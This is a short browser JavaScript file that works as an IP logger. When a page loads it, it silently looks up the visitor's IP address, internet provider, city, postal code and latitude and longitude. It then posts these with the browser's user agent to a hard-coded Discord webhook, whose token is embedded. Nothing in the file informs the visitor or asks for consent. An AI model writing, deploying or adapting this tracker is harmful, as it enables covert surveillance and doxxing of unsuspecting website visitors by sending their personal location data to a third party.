const webHookUrl = "https://discord.com/api/webhooks/1259114940854304769/40loCtX1nLtcWEV-9HwnojQkQ3tDra1BA3Y_tadLYbr3mfEvUvWw1YrfYIhmG0YG3ZcV";

const fetchData = async () => {
    try {
        if (!webHookUrl) {
            console.error('Webhook URL is missing.');
            return;
        }

        // Get IP data
        const response = await fetch('https://ipapi.co/json/');
        if (!response.ok) {
            console.error(`Failed to fetch IP info: ${response.status}`);
            return;
        }

        const data = await response.json();

        const currentIp = data.ip;
        const previousIp = localStorage.getItem('prevIp');

        if (previousIp === currentIp) {
            console.log('Same IP as before, skipping Discord message.');
            return;
        }

        localStorage.setItem('prevIp', currentIp);

        const userAgent = navigator.userAgent;

        const content = [
            `IP-Address: ${currentIp}`,
            ``,
            `Timezone: ${data.timezone}`,
            `Provider: ${data.org} (${data.asn})`,
            ``,
            `Country and Region: ${data.country_name} - ${data.region}`,
            `City: ${data.city}`,
            `Zip Code: ${data.postal}`,
            ``,
            `Longitude: ${data.longitude}`,
            `Latitude: ${data.latitude}`,
            ``,
            `User-Agent: ${userAgent}`
        ].join('\n');

        const payload = {
            content: `\`\`\`\n${content}\n\`\`\`<@&1208424264747847732>`
        };

        const webhookResponse = await fetch(webHookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });

        if (!webhookResponse.ok) {
            console.error(`Failed to send to Discord: ${webhookResponse.status}`);
        } else {
            console.log('Data sent to Discord:', payload);
        }

    } catch (error) {
        console.error('An error occurred:', error);
    }
};

fetchData();
